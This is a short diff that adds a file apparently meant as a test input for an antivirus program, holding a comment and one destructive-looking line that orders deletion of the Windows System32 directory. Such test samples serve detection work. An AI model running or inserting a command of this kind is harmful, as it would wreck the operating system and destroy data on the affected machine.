@@ -1,0 +1,3 @@
+COMMENT Test for antivirus program
+
+DELETE C:\Windows\System32
